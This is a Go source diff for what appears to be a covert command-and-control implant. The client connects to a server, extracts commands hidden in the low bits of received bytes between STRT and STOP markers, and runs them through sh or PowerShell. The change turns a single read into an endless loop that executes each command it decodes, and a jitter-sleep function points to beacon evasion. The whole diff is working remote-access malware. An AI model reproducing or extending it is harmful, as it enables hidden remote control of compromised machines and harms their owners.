@@ -73,76 +73,62 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 	defer uConn.Close()
 
 	fmt.Fprintf(uConn, http_request_string)
-	
+	//when we start sending content-type audio/wav etc from server, need logic to make sure we dont go decoding that
+
 	// Borrow a buffer from the pool
 	buf := bufPool.Get().([]byte)
 	// Return to the pool when the function exits
 	defer bufPool.Put(buf)
 
-	n, err := uConn.Read(buf)
-	if err!=nil && err!=io.EOF{
-		log.Println(err)
-		//fmt.Println("port "+port+" coming mark 6")
-		resultChan <- dialResult{port: port, status: err.Error()}
-		return
-	}
-	//fmt.Println("Recieved ", n, " bits with value", string(buf[:n]), "and bytes ", buf[:n])
-	
-	//************logic for decoding the incoming bytes******************//
-	//-------decoding test
-
 	cmd_bitIndex := 0
 	store_command := 0
-	var decoded_cmd_byte []byte
-	var fifo4 []byte
-	var current_decoded_byte byte
 
-	for _, stegd_byte := range(buf[:n]){
-		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
-		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
-		//fmt.Println(last_bit_int)
-		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)
-
-		cmd_bitIndex++
-		if cmd_bitIndex==8{
-			if store_command==1{
-				decoded_cmd_byte = append(decoded_cmd_byte, current_decoded_byte)
-			}
-			fifo4 = append(fifo4, current_decoded_byte)
-			if len(fifo4) > 4{
-				fifo4 = fifo4[1:]
-			}
-			if "STRT"==string(fifo4){
-				store_command = 1
-			}
-			if "STOP"==string(fifo4){
-				store_command = 0
-			}
-			cmd_bitIndex =0
-			current_decoded_byte = 0
+	for{ //loop forever and keep recieving chunks. If there is a command, execute it
+		n, err := uConn.Read(buf)
+		if err!=nil && err!=io.EOF{
+			log.Println(err)
+			//fmt.Println("port "+port+" coming mark 6")
+			resultChan <- dialResult{port: port, status: err.Error()}
+			return
 		}
+		//fmt.Println("Recieved ", n, " bits with value", string(buf[:n]), "and bytes ", buf[:n])
+		
+		//************logic for decoding the incoming bytes******************//
+		//-------decoding test
+
+		var decoded_cmd_byte []byte
+		var fifo4 []byte
+		var current_decoded_byte byte
+
+		for _, stegd_byte := range(buf[:n]){
+			last_bit_str := fmt.Sprintf("%08b", stegd_byte)
+			last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
+			//fmt.Println(last_bit_int)
+			current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)
+
+			cmd_bitIndex++
+			if cmd_bitIndex==8{
+				if store_command==1{
+					decoded_cmd_byte = append(decoded_cmd_byte, current_decoded_byte)
+				}
+				fifo4 = append(fifo4, current_decoded_byte)
+				if len(fifo4) > 4{
+					fifo4 = fifo4[1:]
+				}
+				if "STRT"==string(fifo4){
+					store_command = 1
+				}
+				if "STOP"==string(fifo4){
+					store_command = 0
+					executeCommand(decoded_cmd_byte)
+				}
+				cmd_bitIndex =0
+				current_decoded_byte = 0
+			}
+		}
+
+		//*****************************end************************************//
 	}
-	finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
-	fmt.Println("decoded_cmd_byte = ", finalCommand)
-
-	shellBinary := "sh"
-	shellFlag := "-c"
-	
-	if runtime.GOOS == "windows"{
-		shellBinary = "powershell"
-		shellFlag = "/C"
-	}
-	cmd := exec.Command(shellBinary, shellFlag, finalCommand)
-	res, err := cmd.Output()
-	if err != nil {
-		log.Fatalf("Failed to execute command: %v", err)
-	}
-
-	formatted_out := strings.TrimSpace(string(res))
-	fmt.Println("result = ", formatted_out) 
-
-	//*****************************end************************************//
-
 
 	resultChan <- dialResult{port: port, status: "success for "+port}
 
@@ -226,4 +212,27 @@ func calculateAndJitter(sl int){
 	fmt.Println("Sleeping for ", actualSleep)
 	time.Sleep(actualSleep)
 	return
+}
+
+func executeCommand(decoded_cmd_byte []byte){
+	if len(decoded_cmd_byte)!=0{
+		finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
+		fmt.Println("decoded_cmd_byte = ", finalCommand)
+
+		shellBinary := "sh"
+		shellFlag := "-c"
+		
+		if runtime.GOOS == "windows"{
+			shellBinary = "powershell"
+			shellFlag = "/C"
+		}
+		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
+		res, err := cmd.Output()
+		if err != nil {
+			log.Fatalf("Failed to execute command: %v", err)
+		}
+
+		formatted_out := strings.TrimSpace(string(res))
+		fmt.Println("result = ", formatted_out) 
+	}
 }
